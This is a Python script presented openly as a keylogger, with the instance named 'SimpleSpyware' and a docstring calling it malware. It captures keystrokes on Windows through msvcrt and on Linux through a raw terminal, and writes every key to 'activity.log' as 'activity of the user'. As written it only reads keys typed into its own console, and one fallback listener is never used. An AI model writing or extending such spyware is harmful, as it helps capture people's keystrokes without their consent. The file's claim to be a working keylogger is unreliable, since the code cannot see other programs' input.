#!/usr/bin/env python3

""" Implementation of simple keylogger in Python.
"""

import sys
import os
import time
import logging
from threading import Thread

# Platform-specific imports
try:
    if sys.platform == "win32":
        import msvcrt
    elif sys.platform.startswith("linux"):
        # For Linux, we'll use a simple approach that may not capture all keys
        import select
        import termios
        import tty
except ImportError as e:
    print(f"Platform not supported: {e}")
    sys.exit(1)


class SimpleKeylogger:
    """ This class represents a simple keylogger using built-in libraries. """

    def __init__(self, name):
        self._name = name
        self._running = False
        self._thread = None

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        """ Start logging keystrokes in a separate thread. """
        self._running = True
        self._thread = Thread(target=self._keyboard_listener)
        self._thread.daemon = True
        self._thread.start()
        
        # Keep the main thread alive
        try:
            while self._running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_logging()

    def stop_logging(self):
        """ Stop the keylogger. """
        self._running = False
        if self._thread:
            self._thread.join(timeout=1)

    def _keyboard_listener(self):
        """ Platform-specific keyboard listener. """
        if sys.platform == "win32":
            self._windows_listener()
        elif sys.platform.startswith("linux"):
            self._linux_listener()
        else:
            logging.error(f"Unsupported platform: {sys.platform}")

    def _windows_listener(self):
        """ Windows implementation using msvcrt. """
        while self._running:
            if msvcrt.kbhit():
                try:
                    key = msvcrt.getch()
                    if key:
                        # Handle special keys
                        if key == b'\x00' or key == b'\xe0':
                            # Function key prefix, get the next byte
                            if msvcrt.kbhit():
                                special_key = msvcrt.getch()
                                logging.debug(f"[SPECIAL:{special_key.hex()}]")
                        else:
                            # Regular key
                            char = key.decode('utf-8', errors='ignore')
                            logging.debug(char)
                except Exception as e:
                    logging.error(f"Error reading key: {e}")

    def _linux_listener(self):
        """ Linux implementation using termios and select. """
        # Save original terminal settings
        old_settings = termios.tcgetattr(sys.stdin)
        
        try:
            tty.setraw(sys.stdin.fileno())
            
            while self._running:
                # Check if there's input available (non-blocking)
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    key = sys.stdin.read(1)
                    if key:
                        # Handle escape sequences for special keys
                        if key == '\x1b':  # ESC sequence
                            # Check if more characters are available
                            if select.select([sys.stdin], [], [], 0.1)[0]:
                                next_chars = sys.stdin.read(2)  # Read 2 more chars
                                logging.debug(f"[ESC:{next_chars.encode().hex()}]")
                        else:
                            logging.debug(key)
                
                # Small delay to prevent high CPU usage
                time.sleep(0.01)
                
        except Exception as e:
            logging.error(f"Error in Linux listener: {e}")
        finally:
            # Restore terminal settings
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

    def _simple_fallback_listener(self):
        """ Fallback method that works on most systems but requires Enter key. """
        print("Using fallback mode (press Enter to log, Ctrl+C to stop)")
        while self._running:
            try:
                line = input()
                if line:
                    logging.debug(f"[LINE]: {line}")
            except EOFError:
                break
            except KeyboardInterrupt:
                break


if __name__ == '__main__':
    # Setup logger.
    logging.basicConfig(
        level=logging.DEBUG,
        filename='activity.log',
        format='Key: %(message)s',
    )
    
    print(f"Starting keylogger on {sys.platform}")
    print("Logging to 'activity.log'")
    print("Press Ctrl+C to stop")
    
    # Create keylogger.
    keylogger = SimpleKeylogger('SimpleSpyware')
    
    try:
        # Start logging activity of the user.
        keylogger.start_logging()
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        keylogger.stop_logging()
    except Exception as e:
        print(f"Error: {e}")
        logging.error(f"Keylogger error: {e}")
